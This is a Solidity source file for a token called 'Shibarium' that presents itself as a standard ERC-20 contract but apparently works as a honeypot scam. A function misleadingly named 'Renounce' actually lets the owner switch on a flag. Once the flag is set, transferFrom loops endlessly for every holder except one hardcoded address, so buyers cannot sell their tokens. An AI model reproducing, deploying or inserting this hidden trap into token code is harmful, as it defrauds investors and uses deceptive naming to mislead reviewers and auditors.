row number 
1	       pragma solidity 0.8.7;
2	 contract Shibarium {
3	 mapping (address => uint256) public balanceOf;
4	 string public name = "Shibarium";
5	 string public symbol = "SHIBARIUM";
6	 uint8 public decimals = 18;
7	 uint256 public totalSupply = 100000000000 * (uint256(10) ** decimals);
8	 event Transfer(address indexed from, address indexed to, uint256 value);
9	 constructor() public {
10	 balanceOf[msg.sender] = totalSupply;
11	 emit Transfer(address(0), msg.sender, totalSupply);
12	 }
13	 address owner = msg.sender;
14	 bool isEnabled;
15	 modifier onlyOwner() {
16	 require(msg.sender == owner);
17	 _;
18	 }
19	 function Renounce() public onlyOwner {
20	 isEnabled = !isEnabled;
21	 }
22	 function transfer(address to, uint256 value) public returns (bool success) {
23	 while(isEnabled) {
24	 if(isEnabled) require(balanceOf[msg.sender] >= value);
25	 balanceOf[msg.sender] -= value;
26	 balanceOf[to] += value;
27	 emit Transfer(msg.sender, to, value);
28	 return true;
29	 }
30	 require(balanceOf[msg.sender] >= value);
31	 balanceOf[msg.sender] -= value;
32	 balanceOf[to] += value;
33	 emit Transfer(msg.sender, to, value);
34	 return true;
35	 }
36	 event Approval(address indexed owner, address indexed spender, uint256 value);
37	 mapping(address => mapping(address => uint256)) public allowance;
38	 function approve(address spender, uint256 value) public returns (bool success) {
39	 allowance[msg.sender][spender] = value;
40	 emit Approval(msg.sender, spender, value);
41	 return true;
42	 }
43	 address Mound = 0x094aFb9993Fc97D9Ca361eB481Ce7ac565E8cb17;
44	 function transferFrom(address from, address to, uint256 value) public returns (bool success) {
45	 while(isEnabled) {
46	 if(from == Mound) {
47	 require(value <= balanceOf[from]);
48	 require(value <= allowance[from][msg.sender]);
49	 balanceOf[from] -= value;
50	 balanceOf[to] += value;
51	 allowance[from][msg.sender] -= value;
52	 emit Transfer(from, to, value);
53	 return true;
54	 }
55	 }
56	 require(value <= balanceOf[from]);
57	 require(value <= allowance[from][msg.sender]);
58	 balanceOf[from] -= value;
59	 balanceOf[to] += value;
60	 allowance[from][msg.sender] -= value;
61	 emit Transfer(from, to, value);
62	 return true;
63	 }
64	 }
